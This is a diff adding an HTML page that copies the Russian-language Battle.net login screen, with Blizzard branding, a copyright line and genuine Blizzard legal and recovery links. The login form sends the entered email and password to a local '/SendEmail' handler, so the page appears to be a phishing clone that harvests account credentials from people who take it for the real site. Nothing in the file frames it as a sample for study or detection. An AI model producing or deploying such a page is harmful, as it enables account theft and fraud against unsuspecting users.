@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Авторизация в Battle.net</title>
+    <link rel="icon" type="image/png" href="images/icon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Авторизация</title>
+</head>
+<body>
+    <div class="container">
+        <div class="center">
+            <img id="main_logo" src="images/main_logo.png" alt="Логотип">
+            <h1 id="text_main">Авторизоваться</h1>
+        </div>
+        <div class="icons">
+            <a href="https://accounts.google.com">
+                <img class="icon" src="images/logo_google.png" alt="Логотип Google ">
+            </a>
+            <a href="https://www.facebook.com/login.php">
+                <img class="icon" src="images/logo_fb.png" alt="Логотип Fb">
+            </a>
+            <a href="https://apple.com">
+                <img class="icon" src="images/logo_apple.png" alt="Логотип Apple">
+            </a>
+        </div>
+        <div class="icons4">
+            <a href="https://login.live.com">
+                <img class="icon" src="images/logo_xb.png" alt="Логотип XB">
+            </a>
+            <a href="https://sony.com">
+                <img class="icon" src="images/logo_ps.png" alt="Логотип PS">
+            </a>
+            <a href="https://accounts.nintendo.com/">
+                <img class="icon" src="images/logo_nintendo.png" alt="Логотип Nintendo">
+            </a>
+            <a href="https://steamcommunity.com/">
+                <img class="icon" src="images/logo_steam.png" alt="Логотип Steam">
+            </a>
+        </div>
+        <form action="/SendEmail" method="post">
+            <div class="login-form">
+                <p id="or" style="color:#ffffff99; margin-bottom: 30px;margin-top: 35px;">или войти через</p>
+                <input type="email" placeholder="Электронная почта или телефон" name="email">
+                <div class="password-input">
+                    <input type="password" placeholder="Пароль" name="password">
+                    <span class="password-icon"></span>
+                </div>
+                <button id="button">Авторизоваться</button>
+        </form>
+        <p class="second-line"><a class="link" href="https://account.battle.net/creation/flow/creation-full" style="color: #007bff;">Зарегистрируйте учетную запись Battle.net</a></p>
+        <p class="third-line"><a class="link" href="https://account.battle.net/creation/flow/creation-full" style="color: #007bff;">бесплатно</a></p>
+        <p class="fourth-line"><a class="link" href="https://account.battle.net/recovery/ru/?ref=&theme=bnet-next&app=oauth&hostingApp=oauth&flowTrackingId=65d6255a-e9bb-40e6-8ef3-32c429e4f70a" style="color: #007bff;">Вы не можете войти?</a></p>
+    </div>
+    <footer>
+    <div class="footer">
+        <p  class="first_links">
+            <a class="links" href="https://www.blizzard.com/ru-ru/legal/08b946df-660a-40e4-a072-1fbde65173b1/licenzionnoe-soglashenie-s-konechnym-polzovatelem-dlya-emea-blizzard">ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ</a> | 
+            <a class="links" href="https://www.blizzard.com/ru-ru/privacy">ПОЛИТИКА КОНФИДЕНЦИАЛЬНОСТИ</a> | 
+            <a class="links" href="https://www.blizzard.com/ru-ru/legal">УСЛОВИЯ</a> |
+        </p>
+        <p class="second_links">
+            <a class="links" href="https://www.blizzard.com/ru-ru/legal/26b8b902-0480-43dd-81ba-2fc75481f1dc/o-narushenii-avtorskogo-prava">АВТОРСКОЕ ПРАВО</a> | 
+            <a class="links" href="https://eu.account.battle.net/login/cookies">ФАЙЛЫ COOKIE</a> | 
+            <a class="links" href="https://eu.account.battle.net/login/cookies#settings">ПАРАМЕТРЫ COOKIE</a>
+        </p>
+        <p class="last_text">&copy; BLIZZARD ENTERTAINMENT, INC., 2023</p>
+    </div>
+    </footer>
+</body>
+</html>
